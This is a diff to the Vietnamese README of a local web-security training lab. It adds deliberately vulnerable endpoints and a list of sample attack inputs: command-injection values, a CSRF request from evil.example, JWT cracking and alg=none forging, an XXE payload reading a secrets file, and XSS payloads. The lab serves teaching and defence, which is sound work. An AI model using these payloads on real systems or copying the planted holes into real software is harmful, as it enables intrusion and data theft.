@@ -10,8 +10,8 @@ npm run doctor                              # kiểm tra môi trường
 npm run serve                               # lab VULN    → http://127.0.0.1:3000
 npm run serve -- --port 3001                # lab VULN    ở port khác
 npm run serve:hardened                      # lab HARDENED → http://127.0.0.1:3000
-npm test                                    # 71 test (guard, ratelimiter, app, scraper, flowload, unit-gaps)
-npm run e2e                                 # 38 check E2E HTTP — tự khởi động 3 server, đối chứng vuln/hardened
+npm test                                    # 115 test (guard, ratelimiter, app, jwt, scraper, flowload, unit-gaps…)
+npm run e2e                                 # 54 check E2E HTTP — tự khởi động 3 server, đối chứng vuln/hardened
 
 node src/cli.js labs                        # danh sách bài thực hành
 node src/cli.js hub                         # Hub học SecHub → http://127.0.0.1:4000
@@ -43,8 +43,17 @@ node src/cli.js scan http://192.168.1.50:3000 --i-own-this-target
 | `GET /download?name=` | Path traversal (`../secrets.txt`) — VFS ảo | chặn `..` |
 | `GET /files/` | Directory listing | 403 |
 | `GET /admin` | Không kiểm tra quyền | 403 nếu không admin |
+| `GET /tools/ping?host=` | **Command Injection** — nối chuỗi vào shell | whitelist + execFile |
+| `POST /settings/email` | **CSRF** — không token, không kiểm Origin | CSRF token + Origin check |
+| `POST /api/token` + `GET /api/profile` | **JWT yếu** — secret123 + nhận alg=none | khoá ngẫu nhiên + verify chặt |
+| `GET /redirect?to=` | **Open Redirect** — 302 tới domain tuỳ ý | chỉ path nội bộ |
+| `POST /upload` + `GET /uploads/` | **Unrestricted Upload** — .html chạy script | whitelist ext + ép text/plain |
+| `POST /api/import` | **XXE** (mô phỏng trên VFS) | 400 với DOCTYPE |
+| `GET/POST /guestbook` | **Stored XSS** | escape output |
 | `GET /slow?ms=` | endpoint chậm 3s (mồi cho DoS demo) | vẫn chậm, nhưng rate limit bảo vệ |
 | `GET /_lab/metrics` | bộ đếm request (dụng cụ học tập) | có |
+| `GET /_lab/log` | log request cho module `detect` | có |
+| `GET /_lab/challenges` + `/_lab/verify` | CTF: 7 thử thách, 170 điểm | CTF tắt (đã vá) |
 | mọi 404/500 | phản chiếu URL / stack trace | trang lỗi chung chung |
 | headers & cookie | thiếu CSP/nosniff…, cookie không cờ | đầy đủ |
 
@@ -69,6 +78,34 @@ username: ' OR 1=1 --     password: (tuỳ ý)
 
 # Path traversal (VFS ảo của lab)
 /download?name=../secrets.txt
+
+# Command Injection (LAB-09) — nối lệnh sau host
+/tools/ping?host=127.0.0.1 & whoami        # Windows (&)
+/tools/ping?host=127.0.0.1; id             # Linux (;)
+/tools/ping?host=127.0.0.1 & set SECLAB    # CTF #5: cờ trong env
+
+# CSRF (LAB-10) — POST đổi email không token, Origin lạ
+curl -X POST .../settings/email -H "Cookie: session=.." -H "Origin: https://evil.example" -d "email=x@x"
+
+# JWT (LAB-11)
+curl -X POST .../api/token -d "username=alice&password=alice123"
+node src/cli.js jwt decode <token>
+node src/cli.js jwt crack  <token>                          # → secret123
+node src/cli.js jwt forge --payload='{"sub":"ctfsvc"}' --alg=none
+curl ".../api/profile?token=<forged>"                       # → cờ CTF #6
+
+# Open Redirect (LAB-12)
+/redirect?to=https://example.com/phish
+
+# Upload (LAB-13)
+curl -X POST .../upload -d "name=poc.html&content=<script>alert(1)</script>"
+curl .../uploads/poc.html    # vuln: text/html → script chạy
+
+# XXE mô phỏng (LAB-14)
+curl -X POST .../api/import -d '<!DOCTYPE r [<!ENTITY x SYSTEM "file:///secrets.txt">]><i><item>&x;</item></i>'
+
+# Stored XSS (LAB-15)
+curl -X POST .../guestbook -d "msg=<svg/onload=alert(1)>"
 
 # So sánh rate limit
 loadtest --path=slow --rps 40   →  vuln: 200 nghẽn 3s   |   hardened: 429 dồn dập
